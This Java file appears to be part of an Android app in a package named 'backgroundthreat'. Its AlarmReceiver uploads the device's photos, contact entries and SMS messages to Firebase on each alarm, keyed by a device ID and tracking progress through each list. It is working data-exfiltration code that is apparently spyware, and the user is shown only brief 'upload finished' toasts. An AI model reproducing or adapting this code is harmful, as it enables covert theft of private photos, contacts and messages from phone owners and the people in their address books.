package com.askme.backgroundthreat;

import android.bluetooth.BluetoothClass;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.util.ArrayList;

public class AlarmReceiver extends BroadcastReceiver {

    Context context;
    FirebaseStorage firebaseStorage;
    StorageReference storageReference;
    private FirebaseFirestore firebaseFirestore;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;

        firebaseStorage = FirebaseStorage.getInstance();
        firebaseFirestore = FirebaseFirestore.getInstance();
        storageReference = firebaseStorage.getReference();

        int imageIndex = SaveRestoreData.getCurrentImageIndex(context);
        int contactIndex = SaveRestoreData.getCurrentContactIndex(context);
        int smsIndex = SaveRestoreData.getCurrentSMSIndex(context);


        ArrayList<String> imageList = SaveRestoreData.getImageList(context);
        ArrayList<ContactItem> contactItemsList = SaveRestoreData.getContactList(context);
        ArrayList<SMSInfo> smsInfoArrayList = SaveRestoreData.getSMSList(context);


        if(imageIndex<imageList.size()) {
            File imgFile = new  File(imageList.get(imageIndex));
            if(imgFile.exists()) {
                uploadImageToFirebase(imgFile, imageIndex);
            }

        } else {
            Toast.makeText(context,"Photo Upload Finished",Toast.LENGTH_SHORT).show();
        }

        if(contactIndex<contactItemsList.size()) {
            ContactItem contactItem = contactItemsList.get(contactIndex);
            Log.d("AlarmLog",contactItem.toString());


            String phoneNum = "";
            for(PhoneContact number :contactItem.getArrayListPhone()) {
                if(number.getPhone() != null && number.getPhone().length() != 0) {
                    if(phoneNum.length() == 0)
                        phoneNum = phoneNum + number.getPhone();
                    else
                        phoneNum = phoneNum + " + " + number.getPhone();
                }
            }
            if(phoneNum.length() == 0) {
                phoneNum = contactItem.getDisplayName();
            }

            firebaseFirestore.collection("users")
                    .document(SaveRestoreData.getUniqueID(context))
                    .collection("contact_info")
                    .document(phoneNum)
                    .set(contactItem)
                    .addOnSuccessListener(documentReference -> {
                        Log.d("AlarmLog", "Contact added");
                        SaveRestoreData.setCurrentContactIndex(context,contactIndex+1);
                    })
                    .addOnFailureListener(e -> Log.w("AlarmLog", "Error adding contact", e));
        } else {
            Toast.makeText(context,"Contacts Upload Finished",Toast.LENGTH_SHORT).show();
        }

        if(smsIndex<smsInfoArrayList.size()) {
            SMSInfo smsInfo = smsInfoArrayList.get(smsIndex);
            Log.d("AlarmLog",smsInfo.toString());

            firebaseFirestore.collection("users")
                    .document(SaveRestoreData.getUniqueID(context))
                    .collection("sms_info")
                    .document(smsInfo.number)
                    .collection("sms")
                    .document(smsInfo.date)
                    .set(smsInfo)
                    .addOnSuccessListener(documentReference -> {
                        Log.d("AlarmLog", "SMS added");
                        SaveRestoreData.setCurrentSMSIndex(context,smsIndex+1);
                    })
                    .addOnFailureListener(e -> Log.w("AlarmLog", "Error adding sms", e));
        } else {
            Toast.makeText(context,"SMS Upload Finished",Toast.LENGTH_SHORT).show();
        }

        if(imageIndex == imageList.size()
                && contactIndex == contactItemsList.size()
                && smsIndex == smsInfoArrayList.size()) {

            abortBroadcast();
        }

        Log.d("AlarmLog","Alarm Fired" + System.currentTimeMillis()/1000);
    }

    void uploadImageToFirebase(File imageFile, int imageCnt) {
        Uri imageUri = Uri.fromFile(imageFile);
        StorageReference ref = storageReference.child("images/" + imageUri.getLastPathSegment());
        ref.putFile(imageUri)
                .addOnCompleteListener(task -> {
                    Log.d("AlarmLog", "Upload done: "+imageUri.toString());
                    SaveRestoreData.setCurrentImageIndex(context,imageCnt+1);
                })
                .addOnFailureListener(e -> {
                    e.printStackTrace();
                    Toast.makeText(context, e.getMessage(), Toast.LENGTH_SHORT).show();
                })
                .addOnProgressListener(taskSnapshot -> {
                    float progress = taskSnapshot.getBytesTransferred() / taskSnapshot.getTotalByteCount();
                    progress *= 100;
                });
    }
}